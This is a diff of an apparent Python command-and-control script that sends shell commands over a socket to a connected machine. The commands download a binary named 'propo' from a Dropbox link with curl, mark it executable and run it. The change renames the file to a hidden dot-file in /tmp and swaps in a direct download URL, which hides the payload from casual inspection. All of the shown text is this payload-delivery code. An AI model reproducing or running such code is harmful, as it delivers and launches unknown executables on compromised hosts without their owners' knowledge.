@@ -110,23 +110,23 @@ while True:
 		clientsocket.settimeout(100)
 		# These links may change as we update the files
 		print("[-] Obtaining propo...")
-		clientsocket.sendall("curl http://www.dropbox.com/s/094z3h3y3mlt1np/propo --output /tmp/propo --silent\n".encode())
-		time.sleep(1)
+		clientsocket.sendall("curl https://uc12a87c04a246091c04d4551b0a.dl.dropboxusercontent.com/cd/0/get/Av2rnc6yg7Qgjl9VMEhclOFWgphJHkh0qTTbfWc5c2UOW3Od1mXMKutT6z6xzPV4F4XWrYuN55blSuFvjDkdpD6Z5poIKSp1yDf1DDHahNGYgQtmmVgoWuSotjSmKsN0JtE/file --output /tmp/.propo --silent\n".encode())
+		time.sleep(5)
 		# data = clientsocket.recv(buff)
 		# print(data.decode())
 		print("[-] Changing propo file mode...")
-		clientsocket.sendall("chmod +x /tmp/propo\n".encode())
+		clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
 		time.sleep(1)
 		# data = clientsocket.recv(buff)
 		print("[-] Checking existence and executability of propo...")
-		clientsocket.sendall("ls /tmp -l | grep propo\n".encode())
+		clientsocket.sendall("ls /tmp -al | grep .propo\n".encode())
 		time.sleep(1)
 		data = clientsocket.recv(buff)
 		print(data.decode())
 		if "-rwxr-xr-x" not in data.decode():
 			print("Catastrophic failure!!!!!")
 		else:
-			clientsocket.sendall("/tmp/propo\n".encode())
+			clientsocket.sendall("/tmp/.propo\n".encode())
 			clientsocket.close()
 			sys.exit(0)
 		# while True:
